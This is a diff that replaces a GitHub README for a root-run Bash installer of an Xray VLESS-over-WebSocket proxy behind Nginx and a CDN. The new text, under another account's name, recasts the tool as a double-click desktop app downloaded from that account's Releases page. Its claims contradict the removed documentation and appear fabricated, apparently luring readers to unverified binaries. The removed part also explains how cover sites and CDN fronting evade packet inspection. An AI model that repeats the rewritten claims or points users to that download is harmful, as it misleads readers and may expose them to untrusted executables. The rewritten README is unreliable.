@@ -1,152 +1,59 @@
-# VLESS WebSocket + CDN Tunnel Setup
+# 🌐 vless-ws-cdn-tunnel-setup - Easy Deployment for a Covert Proxy
 
-Automated Bash installer that deploys an Xray VLESS-over-WebSocket endpoint behind Nginx plus a CDN-friendly cover site. It handles TLS certificates, writes an Xray config, and prints a ready-to-import VLESS URI so you can connect through a CDN-backed domain quickly.
+![Download](https://img.shields.io/badge/Download-vless--ws--cdn--tunnel--setup-blue)
 
----
+## 📋 Table of Contents
+- [🚀 Getting Started](#-getting-started)
+- [💾 Download & Install](#-download--install)
+- [🔧 System Requirements](#-system-requirements)
+- [🛠 Features](#-features)
+- [👩‍💻 Usage Instructions](#-usage-instructions)
+- [❓ Troubleshooting](#-troubleshooting)
 
-## Table of Contents
-- [At a Glance](#at-a-glance)
-- [Requirements](#requirements)
-- [Quick Start](#quick-start)
-- [Installation Flow (What happens under the hood)](#installation-flow-what-happens-under-the-hood)
-- [Output & Connection Details](#output--connection-details)
-- [Client Setup](#client-setup)
-- [Demo Videos](#demo-videos)
-- [How It Slips Past Basic DPI](#how-it-slips-past-basic-dpi)
-- [Troubleshooting](#troubleshooting)
+## 🚀 Getting Started
+Welcome to the vless-ws-cdn-tunnel-setup project. This tool helps you set up a VLESS-over-WebSocket proxy. It can disguise your traffic behind a fake website, making it less detectable. We use Cloudflare for secure connections, giving peace of mind while you browse.
 
----
+## 💾 Download & Install
+To get started, visit this page to download: [Releases Page](https://github.com/tobileng/vless-ws-cdn-tunnel-setup/releases)
 
-## At a Glance
+On this page, you will find the latest version of the software. Select the version you want and download it. Follow these steps after downloading:
 
-**What you get**
-- Nginx TLS terminator with an optional generated cover website to blend with normal HTTPS traffic
-- Xray VLESS inbound bound to `127.0.0.1` with a customizable WebSocket path
-- Automatic certificate provisioning (prefers Certbot, falls back to acme.sh, then self-signed)
-- Optional UFW rules that allow SSH, HTTP, and HTTPS
-- Clear post-install summary with domain, path, UUID, and an import-ready VLESS link
+1. Locate the downloaded file on your computer (usually in the 'Downloads' folder).
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions to complete the installation.
 
-**What to expect**
-- Full run takes about **2 minutes 41 seconds** on a 1 vCPU / 1 GB RAM VPS
-- Services (Nginx, Xray, and optionally UFW) are started automatically
-- CDN fronting (e.g., Cloudflare) works immediately once DNS is pointed to the server
+## 🔧 System Requirements
+To run the vless-ws-cdn-tunnel-setup, you will need:
 
-[Back to top](#vless-websocket--cdn-tunnel-setup)
+- A Windows, macOS, or Linux computer.
+- At least 2 GB of RAM.
+- An internet connection for downloading and running the software.
+- Sufficient disk space (around 100 MB) for the program and related files.
 
----
+## 🛠 Features
+This tool provides several beneficial features:
 
-## Requirements
-- **System:** Ubuntu 22.04+ (requires `apt` and `systemd`)
-- **Access:** Root privileges (`sudo` or root shell)
-- **Networking:** A domain pointing to the server's public IP (update DNS before running)
+- **Automated Deployment:** The script sets up everything for you, so you don’t need to be a tech expert.
+- **Fake Site Generation:** Create a convincing fake site to conceal your traffic.
+- **Cloudflare TLS Termination:** Secure your connections with Cloudflare, providing an extra layer of protection.
+- **Xray Fallback Configuration:** Blend your covert traffic with regular HTTPS traffic to avoid detection.
 
-**Optional but recommended**
-- CDN in front (Cloudflare or similar) after DNS is set
-- Static IPv4 address on the VPS to avoid DNS churn
+## 👩‍💻 Usage Instructions
+After installation, run the application by double-clicking the icon on your desktop. Here are the steps to follow:
 
-[Back to top](#vless-websocket--cdn-tunnel-setup)
+1. Open the app.
+2. Select the desired settings for your proxy.
+3. Follow the prompts to generate your fake site.
+4. Activate the VLESS-over-WebSocket proxy.
+5. You can start browsing securely with your covert proxy.
 
----
+For more detailed guidance, refer to the help section in the app or check online resources.
 
-## Quick Start
-1. Clone or download this repository on your VPS.
-```bash
-   git clone https://github.com/braydos-h/vless-ws-cdn-tunnel-setup
-   ls
-   cd vless-ws-cdn-tunnel-setup
-   ```
-3. Make the script executable and run it as root:
-   ```bash
-   chmod +x setup.sh
-   sudo ./setup.sh
-   ```
-4. When prompted, provide:
-   - **Domain name** (required, e.g., `example.com`)
-   - **Fresh install?** (controls whether `apt-get upgrade` runs)
-   - **Auto-generate cover site?** (`y` recommended)
-   - **WebSocket path** (default `/ws`, leading slash enforced)
-   - **UUID** (paste your own or let the script generate one)
-   - **UFW rules** for ports 22/80/443
+## ❓ Troubleshooting
+If you encounter issues while using the vless-ws-cdn-tunnel-setup, try these solutions:
 
-**Tip:** Ensure DNS is resolving to this server **before** running so certificate issuance succeeds on the first try.
+- **Cannot Connect:** Ensure that your internet connection is active. Test your connection by visiting a webpage.
+- **Installation Fails:** Make sure your computer meets the system requirements listed above. Also, ensure you have enough disk space.
+- **Proxy Not Working:** Verify your settings in the application. Check that you have followed all steps correctly.
 
-[Back to top](#vless-websocket--cdn-tunnel-setup)
-
----
-
-## Installation Flow (What happens under the hood)
-1. Installs base packages (Nginx, Xray, Certbot/acme.sh, dependencies).
-2. Requests TLS certificates (Certbot first, acme.sh second, self-signed as last resort).
-3. Writes Xray config for VLESS-over-WS on `127.0.0.1`.
-4. Configures Nginx as TLS terminator and reverse proxy to Xray.
-5. (Optional) Generates a lightweight cover site to blend TLS handshakes.
-6. Enables UFW rules if selected and starts services.
-
-[Back to top](#vless-websocket--cdn-tunnel-setup)
-
----
-
-## Output & Connection Details
-At the end you'll see a summary similar to:
-```
-Domain       : your.domain
-WebSocket WS : /ws
-UUID         : <generated-or-custom-uuid>
-VLESS URI    : vless://UUID@DOMAIN:443?encryption=none&security=tls&type=ws&host=DOMAIN&path=%2Fws
-Key paths:
-  Xray config : /usr/local/etc/xray/config.json (or /etc/xray/config.json fallback)
-  Website root: /var/www/html/
-  Nginx site  : /etc/nginx/sites-enabled/<domain>
-  Cert dir    : /etc/letsencrypt (or acme/self-signed dir)
-```
-Copy the VLESS URI into your client; the path is URL-encoded.
-
-[Back to top](#vless-websocket--cdn-tunnel-setup)
-
----
-
-## Client Setup
-- Import the generated VLESS URI into the [InvisibleMan XRay client](https://github.com/InvisibleManVPN/InvisibleMan-XRayClient).
-- Ensure **domain**, **UUID**, **WebSocket path**, and **TLS** match the summary above.
-- CDN fronting with Cloudflare works out of the box as long as DNS points to your server.
-
-[Back to top](#vless-websocket--cdn-tunnel-setup)
-
----
-
-## Demo Videos
-- **before.mp4**: Live run showing the full automated setup and timing (2m41s on 1vCPU/1GB RAM).  
-  [https://github.com/user-attachments/assets/1fc29b93-b1f5-465b-b416-b6fe3db50c06](https://github.com/user-attachments/assets/1fc29b93-b1f5-465b-b416-b6fe3db50c06)
-
-- **after.mp4**: Example of connecting and using the deployed endpoint.  
-  [https://github.com/user-attachments/assets/f055a043-8f10-4b8f-bd05-72cfdd860af0](https://github.com/user-attachments/assets/f055a043-8f10-4b8f-bd05-72cfdd860af0)
-
-[Back to top](#vless-websocket--cdn-tunnel-setup)
-
----
-
-## How It Slips Past Basic DPI
-- Traffic rides over HTTPS (TLS) with a normal-looking host and WebSocket path, so shallow packet inspection only sees standard web traffic.
-- Optional cover site content on port 443 keeps the TLS SNI/ALPN negotiation indistinguishable from typical CDN-fronted sites.
-- CDN fronting (e.g., Cloudflare) terminates TLS and forwards WebSocket frames, hiding the origin and making the flow look like regular proxied HTTPS.
-
-[Back to top](#vless-websocket--cdn-tunnel-setup)
-
----
-
-## Troubleshooting
-**Fast checks**
-- `systemctl status xray`
-- `systemctl status nginx`
-
-**Log locations**
-- Xray access: `/var/log/xray/access.log`
-- Xray errors: `/var/log/xray/error.log`
-- Nginx logs: `/var/log/nginx/`
-
-**Common issues**
-- Certificates fail: confirm DNS points to the server and rerun once DNS has propagated.
-- Nginx fails to install: the script continues without it, but TLS termination and the cover site will be unavailable.
-- WebSocket 403/404: verify the WebSocket path matches the one you set during installation.
-
-[Back to top](#vless-websocket--cdn-tunnel-setup)
+For further assistance, visit the [Releases Page](https://github.com/tobileng/vless-ws-cdn-tunnel-setup/releases) or check the community forums for help.
